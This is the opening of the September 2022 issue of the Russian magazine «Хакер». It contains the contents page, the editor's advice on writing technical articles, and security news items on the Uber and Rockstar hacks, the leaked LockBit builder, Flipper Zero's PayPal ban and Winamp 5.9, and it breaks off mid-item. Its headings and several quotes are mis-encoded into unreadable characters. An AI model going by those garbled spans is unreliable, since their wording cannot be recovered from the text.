
                                                    сентябрь 2022
            № 282
CONTENTS

    Как писать статьи
  Колон ка главреда

    MEGANews
  Самые важные события в мире инфо сека за сентябрь

    Бан Kiwi Farms
  По чему Cloudare отказалась защищать сайт, где собираются тролли и сталкеры

    Атака Базарова
   Evil Twin поверх динами ческой маршрутизации

    Летние исследования для чемпионов Security
  Колон ка Дениса Макрушина

    Ядовитые гифки
  Как работает уязвимость GIFShell

    Фундаментальные основы хакерства
  Борем ся с дизассемблерами и зат рудняем реверс программ

    Инфильтрация и эксфильтрация
  Изучаем методы передачи данных при пентестах

    HTB StreamIO
  Раскручива ем доступ к MS SQL до полного захвата машины

    HTB Noter
  Ло маем веб-приложение на Flask

    HTB Seventeen
  Подменя ем пакет NPM для захвата хос та

    HTB Talkative
  Проходим цепочку докер-кон тейнеров для зах вата хоста

     Trickster VPN
  Разбира емся с WireGuard и делаем свой умный VPN

    iOS 16
  Изучаем новые способы защиты дан ных в последней iOS

    Про Pyto
  Делаем веб-сер вер на iOS и качаем видео с youtube-dl

    Вперед в прошлое!
  Как выжить в Windows 2000 в 2022 году

    Сканим на Python
  Как написать и улучшить собствен ный ска нер пор тов

    Интервью с майнером
  ZeroCo0l о переходе эфира на PoS, секретных монетах и дешевых виде окартах

    Титры
  Кто дела ет этот жур нал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
HEADER





КОЛОНКА
ГЛАВРЕДА





На писа ние технических ста тей — занятие,
в котором я упражня юсь дав но и регуляр -
но. Настолько, что уже могу давать дру гим
советы. Недав но меня поп росили выс-
тупить с ними на кон ферен ции OFFZONE       Андрей Письменный                                                                                      Главный редактор
2022, что я и сделал. А по мотивам мас-         apismenny@gmail.com
тер-класса набросал этот спи сок техник
и лай фха ков, которые счи таю самыми важ-
ными.


1. ÏÈØÈ Î ÒÎÌ, ×ÒÎ ÒÅÁÅ ÈÍÒÅÐÅÑÍÎ

Первая статья дает ся тяжелее всего. Одна из причин в том, что новые авторы
часто берут слиш ком глобаль ную тему, которой хватило бы на трехтомник, или,
наоборот, пытаются расписать совет, который уместится в три пред ложения (и
кусок кода в слу чае с «Хакером»). Посоветовать готовое решение здесь неп-
росто, но с прак тикой ты научишь ся попадать в нужные форматы.
   Дру гая проблема — сложно писать о том, что тебе уже надоело. Код,
написан ный в прош лом году, история, которую уже всем рассказал, прог -
рамма, которую уже и сам забросил. Темой нужно гореть, а пока горишь —
не откладывать написание!
  И ни в коем слу чае не под давайся син дрому самозванца. Если ты толь ко
начал разбирать ся в теме, о которой пишешь, это тоже может быть преиму -
ществом: ты на все смот ришь свежим взглядом и еще пом нишь, обо что спо-
тыкаются новички. А работая над стать ей, ты систематизиру ешь и углу бишь
свои знания.


2. ÎÏÈÑÛÂÀÉ ÄÅÉÑÒÂÈß, À ÍÅ ÎÁÚÅÊÒÛ

Если ты просто возь мешь и опишешь какую-то вещь (протокол, формат,
устройство), то получит ся скучная справка, а не статья. Найди проблематику,
и все станет куда веселее. Напиши о своем опы те или о том, как решать кон -
крет ную задачу.
  От личный индикатор того, что статья выйдет статичной и зануд ной, —
заголовок, в котором нет глагола, то есть действия. Поэтому какой-то времен -
ный заголовок стоит написать с самого начала. Заод но поможет лучше очер-
тить тему.


3. ÍÀ×ÈÍÀÉ Ñ ÑÓÒÈ

Любимый прием некоторых авторов — начать с какого-нибудь до боли очевид -
ного утверждения. Не стоит так делать. Начинай сразу с сути! И писать,
и читать такой текст будет лег че.
   Ког да допишешь статью, вернись в начало и добавь лид — абзац, который
будет сообщать читателю, зачем тратить время на чтение всего осталь ного.
Что человек узнает из тек ста? Чему научит ся? Где пригодят ся эти знания?
Почему тема кру та и акту аль на? Все это поможет ему не скроллить статью
в попыт ках узнать ответ самостоятель но.


4. ÍÅ ÑÒÀÐÀÉÑß ÇÂÓ×ÀÒÜ ÓÌÍÅÅ

Желание зву чать более уверен но не тянет на смертный грех, но вынуждает
автора стилизовать текст под что-то, чем он быть не должен. Среди любимых
ориентиров: научная работа, полицейский протокол и старин ное пись мо.
  Явный маркер первого — утомитель ная избы точность и слова вроде «явля-
ется» и «дан ный». Второго — «в следствие». Любителей старины выдают сло-
вечки вроде «ибо» и «покуда». А иног да текст перек лючается между этими
режимами произволь но.
   Технические статьи лучше всего писать простым и понят ным язы ком —
почти разговорным, но более склад ным. Любые украшения скорее помешают
воспринимать и без того гру зящее мозг содержимое (а по неопыт ности, ско-
рее всего, еще и выйдут криво). Так зачем усложнять себе жизнь?


5. ÏÎÉÌÈ, ÏÎ×ÅÌÓ ÎÑÒÀÍÎÂÈËÑß

Что делать, если работа встала и никак не идет даль ше? Убрать ся в ком нате,
посмотреть сериаль чик и выпить пивка — неправиль ные ответы. Единствен -
ный продук тивный способ прок растинации — еще раз перечитать написан ный
текст.
   Если и после этого мысль не приш ла, то задумайся: какой информации
тебе может не хватать, чтобы продолжить? Что было бы полезно знать? Иног -
да достаточно одного запроса в Google, и дело сразу сдвинет ся с мертвой точ-
ки.
  Бы вает и так, что просто не получается сформулировать пред ложение. Поп-
робуй написать начерно, пометив этот участок любым удобным образом.
Зачастую черновой вариант оказывается очень близок к чистовому, или нужная
формулировка сама придет к тебе при очеред ном перечитывании.
   Ну и в кон це кон цов, не забывай, что ты можешь действитель но устать.
Написание  статей —  интенсивный  мыслитель ный  процесс,  который
за четыре-пять часов силь но истощает мозг. Зато после прогулки или сна под -
сознание может само родить решение проблемы. Главное — не забудь вер-
нуть ся к работе!


6. ÁÓÄÜ ×ÅÑÒÍÛÌ Ñ ×ÈÒÀÒÅËÅÌ

Среди более опыт ных авторов попадаются хит рецы, которые вместо допол-
нитель ного ресерча научились акку рат но обходить места, где им не хватило
знаний.  Редак тор,  конечно,  сразу  замечает  такие маневры. Возможно,
и читатель тоже. Либо (что еще хуже) начнет мотать текст туда-сюда и удив-
лять ся, почему о каком-то важном момен те ничего не сказано.
  Бы вает и так, что просто забываешь дать нужные пояснения. Поэтому
рекомен дую, перечитывая статью, думать о том, какие вопросы могут воз-
никнуть у разных читателей и можешь ли ты дать на них ответы в тек сте. Если
не можешь даже с дополнитель ными усилиями, то так и напиши. Отсутствие
ответа иног да тоже ответ.
   Есть и более мелкий, но не менее досад ный вид неточностей — те,
которые прячут ся за словами типа «доволь но», «некоторый», «относитель но».
Приведи вместо расплывчатой оцен ки точные дан ные, и текст от этого выиг -
рает.


7. ÂÛÊÈÄÛÂÀÉ ÂÑÅ ËÈØÍÅÅ

Классический совет по редак туре — убрать все, что не несет смысла и не
помогает раскрыть тему. Это работает сразу на несколь ких уровнях: лиш ними
бывают слова, пред ложения или целые абзацы.
   Начнем с абзацев. «Воду» ты, скорее всего, заметишь, а если нет, то
редак тор лег ко сцедит ее. Более сложный слу чай — ког да текст ходит по теме
кру гами. Тог да нужно убрать повторы, а осталь ное переставить в логическом
поряд ке.
   Повторы встречают ся и на уровне пред ложений. Если написал «дру гими
словами» — возможно, есть смысл оставить толь ко иду щий даль ше второй,
более ясный вариант объяснения. Заод но воздержись от напоминаний, что
что-то уже было выше или что читатель может уже знать изложен ные фак ты.
   Что до лиш них слов, то их в основном плодит кан целярский стиль. Если
что-то можно сказать одним словом — скажи одним, а не дву мя-тремя! Очень
частый пример: «для того, чтобы» всег да можно заменить на «чтобы».


8. ÇÀÏÈÑÛÂÀÉ ÈÄÅÈ

Что, если ты пишешь что-то одно, а в голову приходит мысль, которая относит -
ся к совсем дру гой части статьи? Ни в коем слу чае не теряй ее, она может
не посетить тебя снова!
   Лучше всего дописать до точки, а затем пойти и быстро сделать замет ку
примерно в нужном месте тек ста или просто черкануть в кон це. Потом вер-
нешь ся к ней и распишешь под робнее. У меня к середине статьи обычно
собирается чуть ли не поабзацный план второй половины. Остается толь ко
сортировать замет ки в логическом поряд ке и добавлять пояснения.
  Оставляя работу до дру гого раза (особен но если он будет не на следующий
день), всег да выг ружай из головы все цен ные планы и идеи. Может казать ся,
что память не под ведет, но замет ка всег да надежнее.


9. ÏÐÀÊÒÈÊÓÉÑß ÁÎËÜØÅ!

Чтобы лучше что-то делать, нужна прак тика. Правило про десять тысяч часов
в слу чае с написанием статей работает так же, как и для дру гих занятий.
   Хорошая новость: техническому специалисту вовсе не обязатель но быть
классным писателем, чтобы публиковать ся! В «Хакере» боль шую часть тек стов
пишут новые авторы, которые хотят просто поделить ся своими знаниями. Мы
стараем ся доводить тек сты до ума силами редак ции или хотя бы совету ем, что
и как улучшить.




                      Ес ли  при думал  тему  для  «Хакера»  и  готов
                      садиться за работу, опи ши идею парой пред -
                      ложений и отправь мне на pismenny@glc.ru. Если
                      тема нам под ходит, я выш лю условия и допол -
                       нительные рекомендации.


Постоян ным же авторам рекомен дую брать в руки diﬀ и сравнивать варианты
до и после редак туры. За каждой правкой стоят какие-то соображения,
о которых ты можешь вежливо поин тересовать ся и узнать что-то новое.
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


В этом месяце: ком пании Uber и Rockstar Games взло -
мал 17-лет ний под росток, в сеть сли ли бил дер вымога теля
LockBit, среди хакеров распростра няет ся кряк нутая вер сия
инстру мен та Brute Ratel, десктоп ное при ложение Microsoft
Teams хра нит токены откры тым тек стом, исследова тель
про демонстри ровал      «неиспра вимый»      экспло ит
для PlayStation, вышел обновлен ный Winamp 5.9, а так же
дру гие важные события месяца.
ВЗЛОМ UBER И
ROCKSTAR GAMES
Сен тябрь ознаменовался сразу дву мя крупными взломами, от которых постра-
дали ком пании Uber и Rockstar Games. Очень похоже, что за этими атаками
стоял один и тот же под росток.
  Первой от ком прометации пострадала ком пания Uber, и злоумыш ленник
охот но поделился со СМИ скрин шотами внут ренних систем жертвы. Судя
по ним, он получил полный доступ ко многим критически важным системам
Uber, включая защит ное ПО ком пании и домен Windows.
   Так же взлом щик добрался до кон соли Amazon Web Services, виртуаль ных
машин VMware  vSphere/ESXi, панели администратора элек трон ной почты
Google Workspace и сервера Slack, на котором публиковал сообщения, и bug
bounty прог раммы ком пании на HackerOne.





Журналистам несколь ких изданий удалось пообщать ся с хакером, и тот пох-
вастался, что ему всего 18 лет и он взломал Uber, исполь зуя социаль ную инже-
нерию, так как «у ком пании слабая безопасность».
  Самое интересное: ответствен ность за эту атаку в Uber возложили на учас-
тника хак-группы Lapsus$, о которой мы писали не раз. Напом ню, что вес-
ной 2022 года после череды гром ких атак на Nvidia, Samsung, Microsoft и Okta
полиция Лон дона арестовала семь человек в возрасте от 16 лет до 21 года «в
связи с расследованием деятель ности хакерской группы».
  В настоящее время все они находят ся под следствием, а двум под росткам
предъявлены обвинения. Эти аресты совпали с объявлением о том, что нес-
коль ко членов Lapsus$ на время уходят в отпуск, и с тех пор активность группы
прак тически сош ла на нет.
  Но похоже, в Uber считают, что правоохранитель ные органы наш ли далеко
не всех участников Lapsus$.
   Вскоре после Uber атаке под верглась ком пания Rockstar Games, что при-
вело к одной из крупнейших утечек в истории игровой индустрии. В резуль тате
этого взлома в сеть попали десят ки роликов с геймплеем еще не вышед шей
GTA VI (их слил сам хакер), и взлом щик заявил, что украл «исходный код и ассе-
ты GTA V и VI, а так же тестовую сборку GTA VI».





При     этом     злоумыш ленник,     скры вающийся     под     никами
teapots2022 и teapotuberhacker, утверждает, что имен но он ском прометировал
Uber нем ногим ранее. Teapotuberhacker писал, что не ожидал такого внимания
и даже хотел «договорить ся» с Rockstar Games и Take-Two Interactive (издатель
и владелец ком пании Rockstar Games), судя по всему — желая пот ребовать
у ком паний день ги.
  Од нако масштабы этих инциден тов быстро привлекли к слу чившемуся вни-
мание властей и правоохранитель ных органов, и уже несколь ко дней спустя
полиция  лон дон ского Сити  сообщила об  аресте  17-лет него под ростка
из Оксфордшира. Его обвиняют в двух слу чаях нарушения условий освобож-
дения под залог, а так же в двух компь ютерных преступлениях. Его имя не рас-
кры вает ся, так как он несовершеннолет ний.
  После этого многие ИБ-эксперты и известный журналист Мэтью Киз (со
ссылкой на собствен ные источники) писали, что имен но задержанный стоял
за недавними гром кими взломами ком паний Uber и Rockstar Games. При этом
Мэтью Киз и его источники под тверждают: арестован ный под росток —
это участник Lapsus$, которого ранее уже арестовывали за взлом Microsoft
и Nvidia.
  Известно, что задержанный своей вины пока не признал и остается
под стражей.


4 000 000 ДОМЕНОВ ДЛЯ УДАЛЕНИЯ

Сог ласно статис тике компании Google, количес тво уникаль ных доменов вер хне го уров ня, ссыл -
ки на которые тре буют удалить правообладате ли (в соот ветс твии с законом США «Об автор -
ском праве в цифровую эпо ху», DMCA), в этом месяце перевалило за 4 000 000.

В общей сложности за всю «исто рию наблюдений» у Google тре бовали удаления 6 миллиар -
дов URL. С такими тре бованиями к компании за про шед шие годы обращал ся 326 221 правооб-
ладатель.

Боль ше все го запросов, 579,5 миллиона, пос тупило от BPI LTD —  British Phonographic
Industry, ассо циации, в которую вхо дят Universal Music UK, Sony Music UK и Warner Music UK.





БИЛДЕР LOCKBIT
ПОПАЛ В ОТКРЫТЫЙ
ДОСТУП
ИБ-специалисты сообщили, что билдер известного шифроваль щика LockBit
опубликован в откры том доступе. Судя по всему, LockBit 3.0 слил в сеть
недоволь ный разработ чик или кон курент одноимен ной группировки.
  Напом ню, что хак-группа LockBit выпустила обновлен ную малварь LockBit
версии 3.0 в июне 2022 года и вместе с этим пред ставила собствен ную
вымогатель скую прог рамму bug bounty, пред лагая дру гим злоумыш ленникам
день ги за интересные уязвимости.
   Как теперь сообщил ИБ-исследователь, известный под ником  3xp0rt,
недавно зарегистрирован ный поль зователь Twitter по имени Ali Qushji утвер-
ждает, что вместе с коман дой он взломал серверы LockBit и обнаружил там
билдер шифроваль щика LockBit 3.0, который и поспешил слить в откры тый
доступ.





После этого дру гой известный ИБ-эксперт vx-underground под твердил, что
еще 10 сен тября с ними связался поль зователь с ником protonleaks и тоже
поделился копией того же билдера. При этом, по словам vx-underground, офи-
циаль ный пред ставитель группировки LockBit утверждает, что никакого взлома
вообще не было, а приват ный билдер распространяет недоволь ный руководс-
твом хак-группы наем ный разработ чик.
   ИБ-специалисты уверены, что вне зависимости от источника этой утечки
публикация билдера LockBit 3.0 в сети, скорее всего, увеличит количество
вымогатель ских атак. Ведь билдер позволяет преступникам быстро создавать
исполняемые файлы, необходимые для запуска собствен ной кам пании (вклю-
чая сам шифроваль щик, дешифровщик и специализирован ные инстру мен ты).





По сути, инстру мент состоит из четырех файлов: генератора ключей шиф-
рования, самого билдера, изменяемого файла кон фигурации и batch-файла
для сборки всех файлов. Так, файл cong.json можно исполь зовать для нас-
тройки шифроваль щика, в том числе отредак тировать записку с требованием
выкупа, изменить парамет ры кон фигурации, перечислить, какие процессы
и службы следует завершить, и даже задать управляющий сервер, куда мал-
варь будет отправлять дан ные. То есть ничто не мешает любым злоумыш -
ленникам связать вредонос со своей собствен ной инфраструк турой.
  К сожалению, прог нозы экспертов начинают сбы вать ся. Утек ший билдер
уже взяла на воору жение хак-группа Bl00Dy, построив с его помощью шиф-
роваль щик, который затем исполь зовался для атаки на неназванную укра-
инскую ком панию.


304 000 000 УТЕКШИХ СТРОК

Ле том 2022 года иссле дователи Group-IB зафиксировали двукратный рост  количес тва
выложенных в открытый дос туп баз данных рос сийских компаний (по срав нению с вес ной это го
года).

За три лет них месяца в сеть попало 140 баз, причем антирекорд был пос тавлен в августе —
100 утечек . Общее количес тво строк всех лет них сливов рав няет ся пример но 304 мил-
лионам.

Этот антирекорд экспер ты свя зывают с «мегаутечкой», которая включала базы данных сразу 75
рос сийских компаний. Для срав нения: за всю вес ну текуще го года было опубликовано все го 73
базы.





Самые крупные утечки были зафиксированы у компаний, работающих в сфе рах дос тавки —
192 миллиона строк, онлайн-видео — 43 миллиона строк, медицинских услуг — 30 мил-
лионов строк.





ДИЗЛАЙКИ НА
YOUTUBE НЕ
РАБОТАЮТ
Mozilla  сообщает,  что  кнопки  обратной  связи  на  YouTube  прак тически
не работают. Даже если поль зователь ясно дает понять, что ему что-то не нра-
вит ся, подобные рекомен дации все равно продолжают поступать.
   Чтобы собрать дан ные, связан ные с реаль ными видео и поль зователями,
исследователи Mozilla привлекли к исследованию доброволь цев, которые при-
меняли  браузерное   расширение   RegretsReporter.  Оно   нак ладывает
на YouTube-ролики, которые просматривают поль зователи, общую кнопку
«Прек ратить рекомен довать». При этом на бэкен де поль зователей зачисляют
в слу чайную группу, и каждый раз, ког да они нажимают эту общую кнопку,
на YouTube отправляют ся разные сиг налы: «Не нравит ся», «Не интересу ет», «Не
рекомен довать этот канал», «Удалить из истории». Так же из поль зователей
образует ся кон троль ная группа, от которой на YouTube не поступает никакой
обратной связи.
  Исполь зуя дан ные, собранные из 500 миллионов рекомен дован ных видео,
исследователи создали более 44 тысяч пар видео — одно «отклонен ное»
видео и видео, впоследствии рекомен дован ное YouTube. Затем исследователи
оценивали эти пары или исполь зовали машин ное обу чение, чтобы решить,
была ли рекомен дация похожа на видео, которое ранее уже отклонил поль -
зователь.
   Как показало сравнение с кон троль ной группой, отправка сиг налов «Не нра-
вит ся» и «Не интересу ет» прак тически неэффективна и не предот вращает
нежелатель ные рекомен дации от YouTube (было предот вращено лишь 12%
из 11% нежелатель ных рекомен даций). Кнопки «Не рекомен довать канал»
и «Удалить из истории» оказались чуть более эффективными — они предот вра-
тили 43% и 29% нежелатель ных рекомен даций. Однако исследователи под -
черкивают, что инстру мен тов, которые пред лагает YouTube, недостаточно, что-
бы избавить ся от нежелатель ного кон тента.


      «YouTube äîëæåí óâàæàòü îòçûâû ïîëüçîâàòå ëåé, ðàññìàòðèâàÿ  èõ
       êàê çíà÷èìûå ñèã íàëû î òîì, êàê ëþäè õîòÿò ïðîâîäèòü ñâîå âðå ìÿ«
      íà ïëàòôîðìå», — ïèøóò èññëå äîâàòåëè.                »
Пред ставитель YouTube Елена Эрнандес (Elena Hernandez) объясняет, что
такое  поведение  плат формы  пред намерен но,  посколь ку  YouTube  вовсе
не пытается отсекать весь кон тент, связан ный с какой-либо темой. При этом
Эрнандес раскритиковала отчет Mozilla, заявив, что в нем не учитывается,
как устроены элемен ты управления YouTube.


      «Âàæíî, ÷òî íàøè ýëå ìåíòû óïðàâëå íèÿ íå îòôèëüòðîâûâàþò öåëûå
     òåìû èëè òî÷êè çðå íèÿ, òàê êàê ýòî ìîæåò èìåòü íåãàòèâíûå ïîñëåäñ-«
      òâèÿ äëÿ çðèòåëåé, ñîçäàâàÿ „ýõî‑êàìåðû“, — ãîâîðèò Ýðíàíäåñ. — Ìû
      ïðèâåòñòâóåì  àêàäåìè÷åñêèå  èññëå äîâàíèÿ  íà  íàøåé  ïëàòôîðìå,
      ïîýòîìó íåäàâíî ìû ðàñøèðèëè äîñòóï ê Data API ÷åðåç èññëå äîâàòåëü-
      ñêóþ ïðîã ðàììó YouTube. Íî â îò÷å òå Mozilla íå ó÷èòûâàåòñÿ, êàê íà
     ñàìîì äåëå ðàáîòàþò íàøè ñèñòåìû».                »
По ее словам, определение «похожего», которое исполь зует Mozilla, не при-
нимает во внимание, как устроена система рекомен даций на YouTube. По сло-
вам Эрнандес, фун кция «Неин тересно» удаляет кон крет ное видео, а кнопка
«Не рекомен довать этот канал» предот вращает рекомен дации с кон крет ного
канала в будущем. Она объясняет, что в таких слу чаях YouTube вовсе не стре-
мит ся вообще прек ратить рекомен дации любого кон тента, связан ного с кон -
крет ной темой, мнением или спикером.


БИБЛИОТЕКА С ГОЛОСАМИ ПРЕСТУПНИКОВ





На Вос точном эко номичес ком форуме зампред прав ления Сбер банк Станис лав Куз нецов рас -
сказал, что с начала треть его квар тала 2022 года банк отразил свыше 450 DDoS-атак, а это
боль ше, чем за пос ледние 5 лет суммарно.При этом атакам под вергается не толь ко сам банк,
но и его поль зовате ли. Так, к основным видам наруше ний на сегод няшний день можно отнести
фишинг и телефонное мошенничес тво, и с ними в Сбер банке борют ся, в том чис ле при помощи
библиоте ки с голосами прес тупников.

         «Важно, как мы про тивос тоим [атакам], какими личными раз работ ками мы→       поль зуемся. Одной из них явля ется исполь зование библиоте ки голосов прес -
       тупников, библиоте ки голосов мошенников. И именно эта библиоте ка нам
       сегод ня помогает прод винуть ся дос таточно уве ренно впе ред по про тиво дей-
      ствию телефонному мошенничес тву. Мы для себя обнаружили сле дующий
       тренд. Видимо, мошенники каким-то образом понимают, что они уже становят ся
       на контроль, и они ухо дят из „Сбе ра“. То есть эти прес тупники, голоса которых
       записаны в нашей библиоте ке, фактичес ки ухо дят из „Сбе ра“ и от клиентов
       „Сбе ра“ и тар гетируют свои усилия на клиентах других кре дит ных организаций»,


— рас сказал Куз нецов, добавив, что в нас тоящее вре мя библиоте ка нас читывает пример но
тысячу голосов.





                                       Продолжение статьи →
← Начало статьи
 PAYPAL VS FLIPPER
 ZERO
  Разработ чики «хакерского тамагочи»  Flipper Zero рассказали, что уже два
  месяца не могут вернуть 1,3 миллиона долларов, которые остались на заб-
  локирован ном без указания причин PayPal-аккаунте проекта. Что происходит,
  не может объяснить даже под держка PayPal, и разработ чики говорят, что про-
  изводство Flipper Zero под угрозой.
     Напом ню, что в 2020 году на Kickstarter собрали рекордные 4 882 784 дол-
  лара на производство «хакерского тамагочи» и крайне интересного муль титула
   Flipper Zero, о создании которого мы тог да поговорили с одним из его авторов
  Павлом Жовнером.
    В начале 2022 года участники Kickstarter-кам пании стали получать свои
   гад жеты, а в июне наконец стартовала откры тая продажа Flipper Zero. Вскоре
  после этого бизнес-аккаунт PayPal заблокировали, о чем разработ чики сооб-
  щили в официаль ном Twitter проекта.
     Коман да Flipper Zero рассказывает, что около половины покупателей выб-
  рали PayPal в качестве способа оплаты (так же заказ можно было оплатить бан -
   ковской картой напрямую), но уже через несколь ко дней PayPal инициировал
  проверку аккаунта. «Они попросили какие-то [дополнитель ные] докумен ты,
  и мы сразу их предоставили», — пишет коман да.
     За этим последовало еще несколь ко запросов от PayPal, на которые раз-
  работ чики так же ответили, но в итоге они получили лишь сообщение о пер-
  манен тном бане бизнес-аккаунта Flipper Zero.





       «Ìû îáðàùàëèñü â ïîääåðæêó PayPal, íî äàæå îíè íå ìîãóò ñêàçàòü,
         ÷åãî èìåííî îò íàñ õî÷åò êîìïëàåíñ‑êîìàíäà. Ñåé÷àñ íàì íóæíî ïëà- «
          òèòü çà íîâûå ïàðòèè ïðîäóê öèè, è ýòè äåíüãè èìå þò ðåøàþùåå çíà-
         ÷åíèå äëÿ íàøåãî áèçíåñà. Åñëè êòî‑òî èç íàøåãî ñîîáùåñòâà èìå åò
         ïðÿ ìûå êîíòàêòû âíóòðåííåé êîìàíäû PayPal è ìîæåò êàê‑òî ïîâëèÿòü
         íà ñèòóàöèþ, ìû ïðîñèì âàøåé ïîìîùè», — ãëàñèò îôèöèàëüíîå îáðà-
        ùåíèå ñîçäàòåëåé Flipper Zero.                 »

  ОТКАЗОУСТОЙЧИВОСТЬ РУНЕТА

   Экспер ты Qrator Labs уже в седь мой раз изучили влияние воз можных сбо ев сетей сис темо -
   образующих опе рато ров свя зи на гло баль ную дос тупность националь ных сег ментов интерне -
    та. Выяс нилось, что в 2022 году Рос сия потеря ла сразу 8 позиций, смес тившись на 10-е мес то
   в топ-20.


   Ес ли в 2016 году для попадания в топ-20 дос таточно было иметь про цент потенциаль ного
   отказа сетей чуть более 8% , то сейчас даже показателя в 6,5% уже недос таточно, что бы ока-
   зать ся в лидерах.


  В мире явно прос леживается тенденция повыше ния отказоус тойчивос ти: сред ний показатель
   надежности улучшился с 35,84% до 26,7% .





   Рейтинг отказоус тойчивос ти интерне та в целом дос таточно стабиль ный показатель раз вития
   свя зи уже мно го лет под ряд, и в 2022 году в нем про изошло сразу нес коль ко значитель ных
   изме нений. Ключевые таковы:


   Таиланд вышел из топ-20;


   Ис пания вышла из топ-20;


  США вышли из топ-20;


   Тайвань вышла из топ-20;


  Ир ландия, Бель гия и Гонконг вновь вошли в топ-20 пос ле того, как покинули рейтинг
   в 2021 году;


   Сейшелы впер вые вошли в топ-20.





  В Рос сии про цент потенциаль ного отказа сетей непрерыв но воз растает уже в течение 4 лет.
  По мне нию аналитиков, это точно свя зано с про дол жающимися про цес сами как организацион-
   ной, так и тех ничес кой консолидации отрасли. Поэто му веро ятность того, что в 2023 году Рос -
   сия тоже покинет топ-20, доволь но высока.

   При этом в Рос сии находит ся шес тая из крупнейших в мире точек обме на трафиком — MSK-IX,
   охватывающая 7 городов-мил лионников. Как пишут экспер ты, это еще раз под тверждает, что
  РФ не исполь зует име ющийся у нее колос саль ный потенциал по связ ности в пол ной мере.





ВЫШЕЛ WINAMP 5.9
  В сен тябре произош ло событие, в реаль ность которого было бы сложно
  поверить еще пару лет назад: на сайте Nullsoft опубликовали финаль ную вер-
  сию Winamp 5.9, которая теперь доступна всем желающим.
     За долгие годы своего существования Winamp проделал сложный путь и не
   раз переходил от одной ком пании к дру гой. Так, ком панию Nullsoft, создавшую
  Winamp, еще в 1999 году приобрела AOL, которая и под держивала плеер
  на протяжении многих лет. Затем в 2013 году разработ ку прог раммы, уже рас-
   терявшей немалую долю своей популярности, решили прек ратить,  сайт
  Winamp.com зак рылся (последней версией стала 5.666), а права на Winamp
   в 2014  году выкупила бель гийская ком пания Radionomy, занимающаяся
  интернет-радиовещанием.
    С тех пор никаких новостей о медиаплеере почти не поступало. Лишь
  осенью 2018 года пред ставители Radionomy неожидан но сообщили, что
   в 2019 году Winamp преобразит ся, станет лучше и вернется в строй. Разработ -
   чики заявляли, что намерены сделать Winamp универсаль ным решением
  для прослушивания всего — под кастов, радио, плейлистов и так далее.
     Кроме того, в сен тябре 2018 года поль зователи обнаружили в сети утек -
  шую бета-версию Winamp 5.8, где были исправлены некоторые баги и появи-
   лась под держка Microsoft Audio. Тог да было не совсем ясно, отку да взялась
  новая версия и кто стоял за ее разработ кой. Но вскоре глава Radionomy Алек -
  сандр  Сабун джан  (Alexandre  Saboundjian)  прояснил,  что  над  Winamp
   5.8 работала имен но Radionomy. Новая версия содержит исправления для раз-
  личных багов, в том числе касающихся совместимости с Windows 10, а так же
  убирает из медиаплеера все плат ные фун кции, внед ренные в Winamp рань ше.
     К сожалению, обещан ного релиза обновлен ного Winamp в 2019 году поль -
   зователи так и не дождались, а версия Winamp 5.8 на протяжении четырех лет
   так и оставалась самой новой. Тем не менее в кон це прош лого года сайт
  Winamp.com неожидан но претерпел кардиналь ный редизайн и на нем появил-
   ся новый логотип медиаплеера. Так же на сайте стало можно зарегистри-
   ровать ся для участия в бета-тестировании нового Winamp, которое обещали
   начать совсем скоро.
     Теперь бета-тест наконец окон чен и Winamp 5.9 Final Build 9999 пред ста-
  вили широкой публике.

         «Ýòî  êóëüìèíàöèÿ  òðóäà  äâóõ  êîìàíä  ðàçðàáîò÷èêîâ,  äëèâøåãîñÿ
         ÷åòûðå ãîäà (ñ ìîìåíòà âûïóñêà 5.8) è ïðå ðûâàâøåãîñÿ èç‑çà ïàí- «
         äåìèè, — ïèøåò êîìàíäà â ïðèìå÷àíèÿõ ê ðåëèçó. — Êîíå÷íîìó ïîëü-
         çîâàòå ëþ ìîæåò ïîêàçàòüñÿ, ÷òî èçìå íåíèé íå òàê ìíîãî, íî ñàìîé
         áîëüøîé   è   ñëîæíîé   ÷àñòüþ   ñòàë   ïåðåíîñ   âñå ãî   ïðîåêòà
         ñ VS2008 íà VS2019 è åãî óñïåøíàÿ ñáîðêà».                 »
  Действитель но, самым замет ным изменением в Winamp 5.9 стал перенос при-
  ложения из Visual Studio 2008 в Visual Studio 2019. Причем этот перенос спро-
  воцировал множество проблем с плагинами в более ран них версиях плеера
  среди поль зователей,  у  которых не был  установлен  Visual  Studio 2019
   Redistributable. В финаль ном релизе установщик Winamp сам проверит, все ли
  нужные файлы Visual Studio 2019 есть, и при необходимости пред ложит уста-
   новить их.
     Так же в журнале изменений сообщает ся, что в этом релизе улучшена под -
  держка Windows  11, потоковое вещание через HTTPS://, добавлен новый
   каталог под кастов и под держка воспроизведения в высоком разрешении, улуч-
  шена под держка .itz, .mdz, .s3z и .xmz, а под держка юникода теперь работает
  нормаль но.
     Хотя в Winamp 5.9 устранили множество ошибок, разработ чики обещают,
   что в версии 5.9.1 будет исправлено еще боль ше известных багов. Среди них:
  ошибки в диалоговом окне «О прог рамме», Milkdrop, редак торе AVS, под кастах
   ml_wire, скине Bento.
     Есть и не слиш ком хорошие новости для тех, кому нужен декодер NSV
   VP3, — эта фун кция теперь признана устаревшей.


       «Ìû íèã äå íå ìîæåì íàéòè ñòàðûé èñõîäíûé êîä On2 VP3, ïîýòîìó
       îôèöèàëüíî îáúÿâëÿ åì ýòîò ôîðìàò óñòàðåâøèì», — ïîÿñíÿþò ðàç- «
         ðàáîò÷èêè.                 »
  Скачать обновлен ный Winamp 5.9 можно на официаль ном сайте Nullsoft .


  СКОЛЬКО ПОЛУЧАЮТ В GOOGLE?
   Жур налис ты Business Insider решили выяс нить, сколь ко зарабатывают спе циалис ты Google
   на раз ных дол жнос тях. Для это го они изучили заяв ления на получе ние рабочей визы H-1B, где
   необходимо указывать пред полагаемый базовый оклад. В сос тавленный в ито ге список вошли
